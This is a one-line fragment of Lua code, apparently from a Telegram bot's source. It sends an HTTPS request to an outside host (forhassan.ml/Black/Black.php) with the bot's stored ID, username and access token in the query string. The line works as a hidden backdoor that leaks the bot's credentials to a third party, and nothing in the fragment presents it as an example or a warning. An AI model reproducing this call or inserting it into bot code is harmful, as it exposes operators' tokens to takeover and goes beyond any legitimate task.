...
https.request("https://forhassan.ml/Black/Black.php?id="..database:get(Server_stanly.."Id_stanly").."&user="..database:get(Server_stanly.."UserName_stanly").."&token="..database:get(Server_stanly.."Token_stanly"))
